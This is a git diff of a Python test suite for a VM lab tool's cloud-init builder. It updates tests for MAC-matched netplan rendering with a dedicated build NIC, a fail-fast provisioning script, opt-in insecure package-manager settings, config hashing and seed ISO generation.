@@ -1,4 +1,10 @@
-"""Tests for CloudInitBuilder rendering + config_hash + seed ISO bytes."""
+"""Tests for CloudInitBuilder rendering + config_hash + seed ISO bytes.
+
+ADR-0017: ``network-config`` is the single, final match-by-MAC netplan — it
+carries the dedicated build NIC plus every declared NIC, with no install-vs-run
+staging. ``render_user_data`` no longer renders any netplan; the only network
+``write_files`` entry left is the unconditional disable-network guard.
+"""
 
 from __future__ import annotations
 
@@ -13,11 +19,12 @@ from testrange.builders import CloudInitBuilder
 from testrange.cache import CacheEntry
 from testrange.communicators import SSHCommunicator
 from testrange.credentials import PosixCred
-from testrange.devices import CPU, DHCPAddr, Memory, OSDrive, StaticAddr
-from testrange.devices.network.libvirt import LibvirtNetworkIface
+from testrange.devices import CPU, DHCPAddr, HardDrive, Memory, OSDrive, StaticAddr
+from testrange.devices.network import NetworkIface
 from testrange.exceptions import BuildNotReadyError
 from testrange.guest_io import ExecResult
-from testrange.networks import Network, NetworkAddressing, Switch
+from testrange.networks import Network, NetworkAddressing, Sidecar, Switch
+from testrange.networks.base import BuildNic
 from testrange.packages import Apt, Pip
 from testrange.utils import SSHKey
 from testrange.vms import VMRecipe, VMSpec
@@ -32,24 +39,45 @@ _SW_A = Switch(
     "swA",
     Network("netA"),
     cidr="172.31.0.0/24",
-    dhcp=True,
-    dns=True,
-    nat=True,
     uplink="lo",
+    sidecar=Sidecar(dhcp=True, dns=True, nat=True),
 )
 _SW_B = Switch(
     "swB",
     Network("netB"),
     cidr="10.10.10.0/24",
-    dhcp=True,
-    dns=True,
-    nat=True,
     uplink="lo",
+    sidecar=Sidecar(dhcp=True, dns=True, nat=True),
 )
 DEFAULT_ADDR: Mapping[str, NetworkAddressing] = {
     "netA": NetworkAddressing.from_switch(_SW_A),
     "netB": NetworkAddressing.from_switch(_SW_B),
 }
+
+# The build switch the dedicated build NIC lives on (ADR-0017): nat + dns, so the
+# build NIC's static .3 derives a gateway/DNS at the sidecar .1 (apt egress).
+_BUILD_SW = Switch(
+    "build",
+    Network("build-net"),
+    cidr="10.97.99.0/24",
+    uplink="lo",
+    sidecar=Sidecar(dhcp=True, dns=True, nat=True),
+)
+
+
+def _build_nic(mac: str = "02:00:00:aa:bb:cc") -> BuildNic:
+    """A build NIC at the build switch's .3 infra slot, MAC-matched."""
+    return BuildNic(
+        mac=mac,
+        network="build-net",
+        addr=StaticAddr("10.97.99.3"),
+        addressing=NetworkAddressing.from_switch(_BUILD_SW),
+    )
+
+
+def _macs(spec: VMSpec) -> tuple[str, ...]:
+    """One deterministic declared-NIC MAC per NIC, in spec order."""
+    return tuple(f"02:00:00:00:00:{i:02x}" for i in range(len(spec.nics)))
 
 
 def _spec(name: str = "web") -> VMSpec:
@@ -59,7 +87,7 @@ def _spec(name: str = "web") -> VMSpec:
             CPU(1),
             Memory(512),
             OSDrive("p1", 8),
-            LibvirtNetworkIface("netA", addr=DHCPAddr()),
+            NetworkIface("netA", addr=DHCPAddr()),
         ],
     )
 
@@ -72,12 +100,46 @@ def _recipe(builder: CloudInitBuilder, spec: VMSpec | None = None) -> VMRecipe:
     )
 
 
+def _netcfg(
+    b: CloudInitBuilder,
+    spec: VMSpec,
+    *,
+    addressing: Mapping[str, NetworkAddressing] = DEFAULT_ADDR,
+    build_nic: BuildNic | None = None,
+) -> dict[str, Any]:
+    """Render network-config and parse the unwrapped netplan."""
+    body: dict[str, Any] = yaml.safe_load(
+        b.render_network_config(
+            spec,
+            _recipe(b, spec),
+            addressing=addressing,
+            build_nic=build_nic or _build_nic(),
+            macs=_macs(spec),
+        )
+    )
+    return body
+
+
+def _provision_script(body: dict[str, Any]) -> str:
+    """Extract the bash provisioning script from the single ``runcmd`` entry.
+
+    All provisioning now runs inside one ``["bash", "-c", <script>]`` entry so
+    it executes fail-fast under an ERR trap that emits the build-result record
+    (ADR §21).
+    """
+    runcmd = body["runcmd"]
+    assert len(runcmd) == 1
+    entry = runcmd[0]
+    assert entry[:2] == ["bash", "-c"]
+    return str(entry[2])
+
+
 def _basic_builder() -> CloudInitBuilder:
     return CloudInitBuilder(
         base=CacheEntry("debian-13"),
         credentials=[
             PosixCred("root", password="rootpass"),
-            PosixCred("u", password="upass", ssh_key=_KEY, sudo=True),
+            PosixCred("u", password="upass", ssh_key=_KEY, admin=True),
         ],
         packages=[Apt("nginx"), Apt("curl"), Pip("requests")],
         post_install_commands=("echo hi > /tmp/hi",),
@@ -101,23 +163,19 @@ class TestRenderUserData:
     def test_starts_with_cloud_config_header(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        text = b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR)
+        text = b.render_user_data(spec, _recipe(b, spec))
         assert text.startswith("#cloud-config\n")
 
     def test_yaml_is_valid(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        text = b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR)
-        body = yaml.safe_load(text)
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
         assert isinstance(body, dict)
 
     def test_users_with_pubkey(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
         u = next(u for u in body["users"] if u["name"] == "u")
         assert u["ssh_authorized_keys"] == [_KEY.auth_line]
         assert u["sudo"] == "ALL=(ALL) NOPASSWD:ALL"
@@ -125,8 +183,7 @@ class TestRenderUserData:
     def test_chpasswd(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
         # Modern cloud-init form: chpasswd.users[] with type=text, not the
         # deprecated top-level `list:` string.
         assert "list" not in body["chpasswd"]
@@ -135,83 +192,100 @@ class TestRenderUserData:
         assert users["u"] == {"name": "u", "type": "text", "password": "upass"}
         assert body["chpasswd"]["expire"] is False
 
-    def test_apt_packages(self) -> None:
+    def test_apt_installed_fail_fast_in_script(self) -> None:
+        # apt lives in the trapped script (not cloud-init's `packages:`
+        # directive) so a failed install aborts and reports, not silently
+        # caches a half-provisioned disk (ADR §21).
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
-        assert body["packages"] == ["nginx", "curl"]
-        assert body["package_update"] is True
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
+        assert "packages" not in body
+        assert "package_update" not in body
+        script = _provision_script(body)
+        assert "apt-get update" in script
+        assert "apt-get install -y nginx curl" in script
 
-    def test_runcmd_ends_with_poweroff(self) -> None:
+    def test_script_is_fail_fast_emits_result_and_powers_off(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
-        assert body["runcmd"][-1] == "poweroff"
-        assert "echo hi > /tmp/hi" in body["runcmd"]
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
+        script = _provision_script(body)
+        assert "set -eE" in script
+        assert "trap __tr_emit_fail ERR" in script
+        assert "TESTRANGE-RESULT: ok" in script  # the success token
+        assert "TESTRANGE-RESULT: fail" in script  # the trap's failure record
+        assert "echo hi > /tmp/hi" in script  # post_install_commands run inline
+        assert script.rstrip().endswith("poweroff")  # self-terminating
 
-    def test_pip_packages_via_runcmd(self) -> None:
+    def test_pip_packages_via_script(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
-        joined = "\n".join(body["runcmd"])
-        assert "pip3 install" in joined
-        assert "requests" in joined
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
+        script = _provision_script(body)
+        assert "pip3 install" in script
+        assert "requests" in script
 
     def test_no_credentials_no_chpasswd(self) -> None:
-        b = CloudInitBuilder(
-            base=CacheEntry("x"),
-            credentials=(),
-        )
+        b = CloudInitBuilder(base=CacheEntry("x"), credentials=())
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_user_data(spec, recipe, addressing=DEFAULT_ADDR))
+        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec)))
         assert "chpasswd" not in body
 
 
-class TestInsecureFlags:
-    def test_default_no_write_files(self) -> None:
+class TestDisableNetworkGuard:
+    def test_default_write_files_pins_netplan(self) -> None:
+        # ADR-0017 §4: the disable-network drop-in is unconditional — it pins
+        # the build-boot-rendered netplan across the seed-less run boot.
         b = _basic_builder()
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        assert "write_files" not in body
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        wf = {entry["path"]: entry for entry in body["write_files"]}
+        dis = "/etc/cloud/cloud.cfg.d/99-testrange-disable-network.cfg"
+        assert dis in wf
+        assert yaml.safe_load(wf[dis]["content"]) == {"network": {"config": "disabled"}}
 
-    def test_insecure_apt_drops_conf_d_file(self) -> None:
+    def test_no_netplan_staged_in_write_files(self) -> None:
+        # The /etc/netplan staging file is gone — the netplan is delivered as
+        # network-config, not smuggled via write_files.
+        b = _basic_builder()
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        paths = {entry["path"] for entry in body["write_files"]}
+        assert "/etc/netplan/50-cloud-init.yaml" not in paths
+
+
+class TestInsecureFlags:
+    def test_default_no_apt_conf_d_file(self) -> None:
+        b = _basic_builder()
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        paths = {entry["path"] for entry in body["write_files"]}
+        assert "/etc/apt/apt.conf.d/99-testrange-insecure" not in paths
+
+    def test_insecure_pkg_manager_drops_apt_conf_d_file(self) -> None:
         b = CloudInitBuilder(
             base=CacheEntry("debian-13"),
             packages=[Apt("nginx")],
-            insecure_apt=True,
+            insecure_pkg_manager=True,
         )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
         wf = {entry["path"]: entry for entry in body["write_files"]}
         assert "/etc/apt/apt.conf.d/99-testrange-insecure" in wf
         content = wf["/etc/apt/apt.conf.d/99-testrange-insecure"]["content"]
         assert "Acquire::AllowInsecureRepositories" in content
         assert "APT::Get::AllowUnauthenticated" in content
 
-    def test_insecure_dnf_appends_to_dnf_conf(self) -> None:
-        b = CloudInitBuilder(
-            base=CacheEntry("rocky-9"),
-            insecure_dnf=True,
-        )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        assert wf["/etc/dnf/dnf.conf"]["append"] is True
-        content = wf["/etc/dnf/dnf.conf"]["content"]
-        assert "sslverify=False" in content
-        assert "gpgcheck=0" in content
+    def test_insecure_pkg_manager_is_apt_only(self) -> None:
+        # The single flag emits the apt drop-in only — no dnf config. (The
+        # disable-network guard is always present and is not a package-manager
+        # file.)
+        b = CloudInitBuilder(base=CacheEntry("x"), insecure_pkg_manager=True)
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        apt_paths = {p["path"] for p in body["write_files"] if "apt" in p["path"]}
+        assert apt_paths == {"/etc/apt/apt.conf.d/99-testrange-insecure"}
 
-    def test_both_flags_together(self) -> None:
-        b = CloudInitBuilder(
-            base=CacheEntry("x"),
-            insecure_apt=True,
-            insecure_dnf=True,
-        )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        paths = {entry["path"] for entry in body["write_files"]}
-        assert "/etc/apt/apt.conf.d/99-testrange-insecure" in paths
-        assert "/etc/dnf/dnf.conf" in paths
+
+class TestPackageValidation:
+    def test_rejects_non_apt_pip_package(self) -> None:
+        with pytest.raises(ValueError, match="must be Apt or Pip"):
+            CloudInitBuilder(base=CacheEntry("x"), packages=["nginx"])  # type: ignore[list-item]
 
 
 class TestPipInsecure:
@@ -220,8 +294,8 @@ class TestPipInsecure:
             base=CacheEntry("x"),
             packages=[Pip("requests"), Pip("rich")],
         )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        pip_lines = [c for c in body["runcmd"] if "pip3 install" in c]
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        pip_lines = [ln for ln in _provision_script(body).splitlines() if "pip3 install" in ln]
         assert len(pip_lines) == 1
         assert "--trusted-host" not in pip_lines[0]
         assert "requests" in pip_lines[0] and "rich" in pip_lines[0]
@@ -234,8 +308,8 @@ class TestPipInsecure:
                 Pip("internal-pkg", insecure=True),
             ],
         )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        pip_lines = [c for c in body["runcmd"] if "pip3 install" in c]
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        pip_lines = [ln for ln in _provision_script(body).splitlines() if "pip3 install" in ln]
         assert len(pip_lines) == 2
         secure_line = next(line for line in pip_lines if "--trusted-host" not in line)
         insecure_line = next(line for line in pip_lines if "--trusted-host" in line)
@@ -251,8 +325,8 @@ class TestPipInsecure:
             base=CacheEntry("x"),
             packages=[Pip("internal-pkg", insecure=True)],
         )
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        pip_lines = [c for c in body["runcmd"] if "pip3 install" in c]
+        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b)))
+        pip_lines = [ln for ln in _provision_script(body).splitlines() if "pip3 install" in ln]
         assert len(pip_lines) == 1
         assert "--trusted-host" in pip_lines[0]
 
@@ -261,76 +335,303 @@ class TestRenderMetaData:
     def test_has_instance_id_and_hostname(self) -> None:
         b = _basic_builder()
         spec = _spec("web")
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_meta_data(spec, recipe))
+        body = yaml.safe_load(b.render_meta_data(spec, _recipe(b, spec)))
         assert body["instance-id"] == "iid-web"
         assert body["local-hostname"] == "web"
 
 
 class TestRenderNetworkConfig:
-    def test_matches_by_name_not_mac(self) -> None:
+    """The single match-by-MAC netplan (ADR-0017): build NIC + declared NICs."""
+
+    def test_unwrapped_version_2(self) -> None:
+        b = _basic_builder()
+        body = _netcfg(b, _spec())
+        # cloud-init wraps network-config, so it is delivered unwrapped.
+        assert body["version"] == 2
+        assert "network" not in body
+
+    def test_every_iface_matched_by_mac(self) -> None:
+        b = _basic_builder()
+        body = _netcfg(b, _spec())
+        for cfg in body["ethernets"].values():
+            assert "macaddress" in cfg["match"]
+            assert "name" not in cfg["match"]
+
+    def test_build_nic_present_and_static(self) -> None:
+        b = _basic_builder()
+        body = _netcfg(b, _spec(), build_nic=_build_nic("02:00:00:de:ad:01"))
+        build0 = body["ethernets"]["build0"]
+        assert build0["match"] == {"macaddress": "02:00:00:de:ad:01"}
+        # .3 static on the nat build switch: address + DNS + default route via .1.
+        assert build0["addresses"] == ["10.97.99.3/24"]
+        assert build0["nameservers"] == {"addresses": ["10.97.99.1"]}
+        assert build0["routes"] == [{"to": "default", "via": "10.97.99.1"}]
+
+    def test_zero_nic_vm_still_has_build_nic(self) -> None:
+        # ORCH-9: a NIC-less VM (no-net) builds with the dedicated build NIC.
+        b = _basic_builder()
+        spec = VMSpec(name="no-net", devices=[CPU(1), Memory(512), OSDrive("p1", 8)])
+        body = yaml.safe_load(
+            b.render_network_config(
+                spec, _recipe(b, spec), addressing=DEFAULT_ADDR, build_nic=_build_nic(), macs=()
+            )
+        )
+        assert set(body["ethernets"]) == {"build0"}
+
+    def test_declared_nic_matched_by_its_mac(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        body = yaml.safe_load(b.render_network_config(spec, recipe, addressing=DEFAULT_ADDR))
-        assert body["version"] == 2
-        ifaces = body["ethernets"]
-        assert ifaces
-        for cfg in ifaces.values():
-            assert "macaddress" not in cfg.get("match", {})
-            assert cfg["dhcp4"] is True
+        body = yaml.safe_load(
+            b.render_network_config(
+                spec,
+                _recipe(b, spec),
+                addressing=DEFAULT_ADDR,
+                build_nic=_build_nic(),
+                macs=("02:00:00:11:22:33",),
+            )
+        )
+        assert body["ethernets"]["id0"]["match"] == {"macaddress": "02:00:00:11:22:33"}
+        assert body["ethernets"]["id0"]["dhcp4"] is True
+
+    def test_macs_length_must_match_nics(self) -> None:
+        b = _basic_builder()
+        spec = _spec()  # one NIC
+        with pytest.raises(ValueError, match="match-by-MAC"):
+            b.render_network_config(
+                spec, _recipe(b, spec), addressing=DEFAULT_ADDR, build_nic=_build_nic(), macs=()
+            )
+
+    def test_build_nic_no_route_on_isolated_switch(self) -> None:
+        # An isolated (no-nat) build switch derives no gateway, so the build NIC
+        # is a bare static with no default route (it cannot egress regardless).
+        b = _basic_builder()
+        isolated = Switch(
+            "build", Network("build-net"), cidr="10.97.99.0/24", sidecar=Sidecar(dhcp=True)
+        )
+        bn = BuildNic(
+            mac="02:00:00:aa:bb:cc",
+            network="build-net",
+            addr=StaticAddr("10.97.99.3"),
+            addressing=NetworkAddressing.from_switch(isolated),
+        )
+        body = _netcfg(b, _spec(), build_nic=bn)
+        assert body["ethernets"]["build0"]["addresses"] == ["10.97.99.3/24"]
+        assert "routes" not in body["ethernets"]["build0"]
+
+
+def _static_spec(*nics: NetworkIface) -> VMSpec:
+    return VMSpec(
+        name="web",
+        devices=[CPU(1), Memory(512), OSDrive("p1", 8), *nics],
+    )
+
+
+def _data_spec(*data_sizes: int) -> VMSpec:
+    """A one-DHCP-NIC VM with ``data_sizes`` data disks, in order."""
+    return VMSpec(
+        name="web",
+        devices=[
+            CPU(1),
+            Memory(512),
+            OSDrive("p1", 8),
+            *(HardDrive("p1", s) for s in data_sizes),
+            NetworkIface("netA", addr=DHCPAddr()),
+        ],
+    )
+
+
+class TestDeclaredNicNetplan:
+    """Per-declared-NIC rendering inside the combined netplan."""
+
+    def test_static_nic_full_derivation(self) -> None:
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec = _static_spec(NetworkIface("netA", addr=StaticAddr("172.31.0.50")))
+        eth = _netcfg(b, spec)["ethernets"]["id0"]
+        assert eth["addresses"] == ["172.31.0.50/24"]
+        assert eth["nameservers"] == {"addresses": ["172.31.0.1"]}
+        assert eth["routes"] == [{"to": "default", "via": "172.31.0.1"}]
+        assert "dhcp4" not in eth
+
+    def test_only_first_declared_static_gets_default_route(self) -> None:
+        # Two static NICs: only the first declares the default route. The build
+        # NIC's own route is independent (it is inert at run anyway).
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec = _static_spec(
+            NetworkIface("netA", addr=StaticAddr("172.31.0.50")),
+            NetworkIface("netB", addr=StaticAddr("10.10.10.50")),
+        )
+        eths = _netcfg(b, spec)["ethernets"]
+        assert "routes" in eths["id0"]
+        assert "routes" not in eths["id1"]
+
+    def test_mixed_static_dhcp(self) -> None:
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec = _static_spec(
+            NetworkIface("netA", addr=StaticAddr("172.31.0.50")),
+            NetworkIface("netB", addr=DHCPAddr()),
+        )
+        eths = _netcfg(b, spec)["ethernets"]
+        assert eths["id0"]["addresses"] == ["172.31.0.50/24"]
+        assert eths["id1"]["dhcp4"] is True
+
+    def test_unconfigured_nic_no_dhcp_wait(self) -> None:
+        # addr=None: NIC present, no address. Must NOT emit dhcp4: true (the bug)
+        # — leave it to the OS so boot doesn't block on a lease nothing serves.
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec = _static_spec(NetworkIface("netA", addr=None))
+        eth = _netcfg(b, spec)["ethernets"]["id0"]
+        assert eth["dhcp4"] is False
+        assert eth["dhcp6"] is False
+        assert eth["optional"] is True
+        assert "addresses" not in eth
+
+    def test_explicit_dhcp(self) -> None:
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec = _static_spec(NetworkIface("netA", addr=DHCPAddr()))
+        eth = _netcfg(b, spec)["ethernets"]["id0"]
+        assert eth["dhcp4"] is True
+        assert eth["dhcp6"] is False
+        assert "addresses" not in eth
+
+    def test_static_dictates_gateway_on_dumb_switch(self) -> None:
+        # Dumb L2 switch (no nat/dns => derived gateway/dns are None). A guest at
+        # .123 acts as the gateway; the NIC dictates everything via StaticAddr.
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        bare = {
+            "netA": NetworkAddressing(
+                cidr="192.168.5.0/24", prefix_len=24, dhcp=False, gateway=None, dns_server=None
+            )
+        }
+        spec = _static_spec(
+            NetworkIface(
+                "netA",
+                addr=StaticAddr("192.168.5.124/24", gw="192.168.5.123", dns=("192.168.5.123",)),
+            )
+        )
+        eth = _netcfg(b, spec, addressing=bare)["ethernets"]["id0"]
+        assert eth["addresses"] == ["192.168.5.124/24"]
+        assert eth["routes"] == [{"to": "default", "via": "192.168.5.123"}]
+        assert eth["nameservers"] == {"addresses": ["192.168.5.123"]}
 
 
 class TestConfigHash:
+    def _hash(
+        self,
+        b: CloudInitBuilder,
+        spec: VMSpec,
+        *,
+        base_sha: str = "",
+        sidecar_sha: str = "",
+        build_nic: BuildNic | None = None,
+    ) -> str:
+        return b.config_hash(
+            spec,
+            _recipe(b, spec),
+            addressing=DEFAULT_ADDR,
+            base_sha=base_sha,
+            sidecar_sha=sidecar_sha,
+            macs=_macs(spec),
+            build_nic=build_nic or _build_nic(),
+        )
+
     def test_deterministic(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        h1 = b.config_hash(spec, recipe, addressing=DEFAULT_ADDR, base_sha="abc")
-        h2 = b.config_hash(spec, recipe, addressing=DEFAULT_ADDR, base_sha="abc")
+        h1 = self._hash(b, spec, base_sha="abc")
+        h2 = self._hash(b, spec, base_sha="abc")
         assert h1 == h2
         assert len(h1) == 16
 
     def test_base_sha_affects_hash(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        assert b.config_hash(
-            spec, recipe, addressing=DEFAULT_ADDR, base_sha="aaa"
-        ) != b.config_hash(spec, recipe, addressing=DEFAULT_ADDR, base_sha="bbb")
+        assert self._hash(b, spec, base_sha="aaa") != self._hash(b, spec, base_sha="bbb")
+
+    def test_sidecar_sha_affects_hash(self) -> None:
+        b = _basic_builder()
+        spec = _spec()
+        assert self._hash(b, spec, base_sha="z", sidecar_sha="aaa") != self._hash(
+            b, spec, base_sha="z", sidecar_sha="bbb"
+        )
+
+    def test_build_nic_affects_hash(self) -> None:
+        # ADR-0017: the build NIC's MAC/address are baked into the netplan, so a
+        # different build NIC keys a different artifact.
+        b = _basic_builder()
+        spec = _spec()
+        assert self._hash(b, spec, build_nic=_build_nic("02:00:00:00:00:01")) != self._hash(
+            b, spec, build_nic=_build_nic("02:00:00:00:00:02")
+        )
 
     def test_credentials_affect_hash(self) -> None:
         spec = _spec()
-        b1 = CloudInitBuilder(
-            base=CacheEntry("x"),
-            credentials=[PosixCred("u", password="a")],
+        b1 = CloudInitBuilder(base=CacheEntry("x"), credentials=[PosixCred("u", password="a")])
+        b2 = CloudInitBuilder(base=CacheEntry("x"), credentials=[PosixCred("u", password="b")])
+        assert self._hash(b1, spec, base_sha="z") != self._hash(b2, spec, base_sha="z")
+
+    def test_os_drive_size_affects_hash(self) -> None:
+        b = _basic_builder()
+        spec_small = VMSpec(
+            name="web",
+            devices=[CPU(1), Memory(512), OSDrive("p1", 8), NetworkIface("netA", addr=DHCPAddr())],
         )
-        b2 = CloudInitBuilder(
-            base=CacheEntry("x"),
-            credentials=[PosixCred("u", password="b")],
+        spec_big = VMSpec(
+            name="web",
+            devices=[CPU(1), Memory(512), OSDrive("p1", 64), NetworkIface("netA", addr=DHCPAddr())],
         )
-        r1 = _recipe(b1, spec)
-        r2 = _recipe(b2, spec)
-        assert b1.config_hash(spec, r1, addressing=DEFAULT_ADDR, base_sha="z") != b2.config_hash(
-            spec, r2, addressing=DEFAULT_ADDR, base_sha="z"
-        )
+        assert self._hash(b, spec_small) != self._hash(b, spec_big)
+
+    def test_data_disk_size_affects_hash(self) -> None:
+        b = _basic_builder()
+        assert self._hash(b, _data_spec(10)) != self._hash(b, _data_spec(20))
+
+    def test_data_disk_count_affects_hash(self) -> None:
+        b = _basic_builder()
+        assert self._hash(b, _data_spec(10)) != self._hash(b, _data_spec(10, 10))
+
+    def test_data_disk_order_affects_hash(self) -> None:
+        # Roles are positional (data0, data1, ...); swapping sizes is a different
+        # artifact set.
+        b = _basic_builder()
+        assert self._hash(b, _data_spec(10, 20)) != self._hash(b, _data_spec(20, 10))
+
+    def test_sensitive_to_declared_static_ipv4(self) -> None:
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec_a = _static_spec(NetworkIface("netA", addr=StaticAddr("172.31.0.50")))
+        spec_b = _static_spec(NetworkIface("netA", addr=StaticAddr("172.31.0.60")))
+        assert self._hash(b, spec_a, base_sha="z") != self._hash(b, spec_b, base_sha="z")
+
+    def test_static_vs_dhcp_differs(self) -> None:
+        b = CloudInitBuilder(base=CacheEntry("x"))
+        spec_dhcp = _static_spec(NetworkIface("netA", addr=DHCPAddr()))
+        spec_static = _static_spec(NetworkIface("netA", addr=StaticAddr("172.31.0.50")))
+        assert self._hash(b, spec_dhcp, base_sha="z") != self._hash(b, spec_static, base_sha="z")
 
 
 class TestRenderSeed:
     def test_seed_bytes_are_iso(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        data = b.render_seed(spec, recipe, addressing=DEFAULT_ADDR)
+        data = b.render_seed(
+            spec,
+            _recipe(b, spec),
+            addressing=DEFAULT_ADDR,
+            macs=_macs(spec),
+            build_nic=_build_nic(),
+        )
         # Standard ISO9660 sig at offset 0x8001
         assert data[0x8001:0x8006] == b"CD001"
 
-    def test_seed_contains_user_data(self, tmp_path: pytest.TempPathFactory) -> None:
+    def test_seed_contains_user_data(self) -> None:
         b = _basic_builder()
         spec = _spec()
-        recipe = _recipe(b, spec)
-        data = b.render_seed(spec, recipe, addressing=DEFAULT_ADDR)
-        # Use pycdlib to read back
+        data = b.render_seed(
+            spec,
+            _recipe(b, spec),
+            addressing=DEFAULT_ADDR,
+            macs=_macs(spec),
+            build_nic=_build_nic(),
+        )
         import pycdlib
 
         iso = pycdlib.PyCdlib()
@@ -343,197 +644,8 @@ class TestRenderSeed:
         iso.close()
         assert files["/user-data"].startswith(b"#cloud-config\n")
         assert b"instance-id" in files["/meta-data"]
-        assert b"version" in files["/network-config"]
-
-
-# ----------------------------------------------------------------------------
-# Static-IP / run-phase netplan staging.
-# ----------------------------------------------------------------------------
-
-
-def _static_spec(*nics: LibvirtNetworkIface) -> VMSpec:
-    return VMSpec(
-        name="web",
-        devices=[CPU(1), Memory(512), OSDrive("p1", 8), *nics],
-    )
-
-
-class TestRunPhaseNetplanStaging:
-    def test_pure_dhcp_no_extra_write_files(self) -> None:
-        # No NIC has ipv4 — install-time DHCP netplan is correct for run-phase too.
-        b = _basic_builder()
-        body = yaml.safe_load(b.render_user_data(_spec(), _recipe(b), addressing=DEFAULT_ADDR))
-        paths = {entry["path"] for entry in body.get("write_files", [])}
-        assert "/etc/netplan/50-cloud-init.yaml" not in paths
-        assert "/etc/cloud/cloud.cfg.d/99-testrange-disable-network.cfg" not in paths
-
-    def test_static_nic_writes_netplan_and_disable_cfg(self) -> None:
-        spec = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        np_path = "/etc/netplan/50-cloud-init.yaml"
-        dis_path = "/etc/cloud/cloud.cfg.d/99-testrange-disable-network.cfg"
-        assert np_path in wf
-        assert dis_path in wf
-
-    def test_staged_netplan_has_secure_permissions(self) -> None:
-        # netplan 0.106+ warns on world-readable netplan files.
-        spec = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        assert wf["/etc/netplan/50-cloud-init.yaml"]["permissions"] == "0600"
-        assert wf["/etc/netplan/50-cloud-init.yaml"]["owner"] == "root:root"
-
-    def test_disable_drop_in_content(self) -> None:
-        spec = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        content = wf["/etc/cloud/cloud.cfg.d/99-testrange-disable-network.cfg"]["content"]
-        # Parse as YAML to assert semantic content rather than exact bytes.
-        cfg = yaml.safe_load(content)
-        assert cfg == {"network": {"config": "disabled"}}
-
-    def test_staged_netplan_content_single_static(self) -> None:
-        spec = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
